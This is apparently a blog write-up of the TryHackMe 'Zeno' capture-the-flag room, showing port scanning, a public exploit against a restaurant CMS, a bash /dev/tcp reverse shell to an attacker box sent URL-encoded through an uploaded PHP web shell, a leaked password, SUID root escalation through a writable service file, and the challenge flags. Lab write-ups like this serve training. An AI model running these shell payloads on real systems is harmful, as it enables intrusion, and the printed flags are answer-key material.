<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="monoloc0">
    <meta name="description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 13:37 EDT Nmap scan report for zeno.thm (10.10.149.36) Host is up (0.059s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA) | 256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA) |_ 256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519) 12340/tcp open http Apache httpd 2.">
    <meta name="keywords" content="infosec,bugbounty,personal">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content=""/>
<meta name="twitter:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 13:37 EDT Nmap scan report for zeno.thm (10.10.149.36) Host is up (0.059s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA) | 256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA) |_ 256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519) 12340/tcp open http Apache httpd 2."/>

    <meta property="og:title" content="" />
<meta property="og:description" content="Enumeration    Port Scan     pre code { background-color: #eee; }  Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 13:37 EDT Nmap scan report for zeno.thm (10.10.149.36) Host is up (0.059s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA) | 256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA) |_ 256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519) 12340/tcp open http Apache httpd 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://monoloc0.github.io/zeno/" /><meta property="article:section" content="" />





    <title>
   · monoloc0
</title>

    
      <link rel="canonical" href="https://monoloc0.github.io/zeno/">
    

    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
    

    

    

    

    

    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.89.4" />
  </head>

  
  
  <body class="preload-transitions colorscheme-light">
    

    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://monoloc0.github.io/">
      monoloc0
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://monoloc0.github.io/zeno/">
          
        </a>
      </h1>
    </header>

    <h1 id="enumeration">
  Enumeration
  <a class="heading-link" href="#enumeration">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="port-scan">
  Port Scan
  <a class="heading-link" href="#port-scan">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<style>


pre code {
  background-color: #eee;

}


</style>

<pre tabindex="0"><code class="language-└─$" data-lang="└─$">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 13:37 EDT
Nmap scan report for zeno.thm (10.10.149.36)
Host is up (0.059s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&amp;#39;ve got some trouble | 404 - Resource not found

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.23 seconds

</code></pre><p>As the portscan reveals, Port 12340 is open. So, let&rsquo;s check it out using the browser ;)</p>
<p><img src="../../_resources/zeno1.png" alt="zeno1.png"></p>
<p>Accessing the service running on port 12340 does not really show anything interesting.</p>
<p>Let&rsquo;s run the following command to find any existing paths <code>ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://zeno.thm:12340/FUZZ </code></p>
<p><img src="../../_resources/zeno2.png" alt="zeno2.png"></p>
<p>It seems like there is a CMS running on this webserver (Restaurant Management System)</p>
<p><img src="../../_resources/zeno3.png" alt="zeno3.png"></p>
<p>First off, let&rsquo;s  look for publicly available exploits using <code>searchsploit restaurant management</code></p>
<p>There you go :)
<img src="../../_resources/zeno4.png" alt="zeno4.png"></p>
<p>Next up, I try to use the exploit against the website:</p>
<p><img src="../../_resources/zeno5.png" alt="zeno5.png"></p>
<h1 id="get-reverse-shell">
  Get Reverse Shell
  <a class="heading-link" href="#get-reverse-shell">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>After running the exploit against the target (it uploads a shell on the server), I</p>
<ul>
<li>used <em><a href="https://www.revshells.com/">https://www.revshells.com/</a></em> to generate a reverse shell:
<ul>
<li><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;IP OF ATTACK BOX&gt;/9001 0&gt;&amp;1</code></li>
</ul>
</li>
<li>URL encoded the payload</li>
<li>entered the followin URL in the browser to receive a reverse shell: <code>curl zeno.thm:12340//rms/images/reverse-shell.php?cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%3c%49%50%20%4f%46%20%41%54%54%41%43%4b%20%42%4f%58%3e%2f%39%30%30%31%20%30%3e%26%31</code></li>
</ul>
<p><img src="../../_resources/zeno6.png" alt="zeno6.png"></p>
<h1 id="privilege-escalation-to-low-priv-user">
  Privilege Escalation (to low priv user)
  <a class="heading-link" href="#privilege-escalation-to-low-priv-user">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Run <em>linpeas.sh (<a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh">https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh</a>)</em></p>
<p>The following lines immediately caught my eye:</p>
<p><img src="../../_resources/zeno8.png" alt="zeno8.png"></p>
<p>username: edward
password: FrobjoodAdkoonceanJa</p>
<p>Username <strong>zeno</strong> does not work - a user with this name does not even exist on the system. So I tried out the username <strong>edward</strong> with the found password and voila, we are in:</p>
<p><img src="../../_resources/zeno9.png" alt="zeno9.png"></p>
<pre tabindex="0"><code class="language-[edward@zeno" data-lang="[edward@zeno">THM{070cab2c9dc622e5d25c0709f6cb0510}
</code></pre><h1 id="privilege-escalation-to-root">
  Privilege Escalation (to root)
  <a class="heading-link" href="#privilege-escalation-to-root">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>During my local enumeration I already noticed the following output from <strong>linpeas.sh</strong></p>
<p><img src="../../_resources/zeno10.png" alt="zeno10.png"></p>
<p>It basically shows, that I&rsquo;m able to re-write the service. However, only modifying the service does not really help as it needs to be restarted in order to make my malicious payload run.</p>
<p>I modified the .service file as follows:</p>
<p><img src="../../_resources/zeno10_2.png" alt="zeno10_2.png"></p>
<p>Luckily <strong>edward</strong> is able to perform a reboot of the system.</p>
<p><img src="../../_resources/zeno11.png" alt="zeno11.png"></p>
<p>Restarting the system should make my code (setting SIUD bit for <strong>/bin/bash</strong> binary) run.</p>
<p><img src="../../_resources/zeno12.png" alt="zeno12.png"></p>
<p>Become root:</p>
<p><img src="../../_resources/zeno13.png" alt="zeno13.png"></p>
<p>Get root flag:</p>
<p><img src="../../_resources/zeno14.png" alt="zeno14.png"></p>
<p>root-flag: THM{b187ce4b85232599ca72708ebde71791}</p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2021
     monoloc0 
    ·
    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
    
  </section>
</footer>

    </main>

    
      
      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
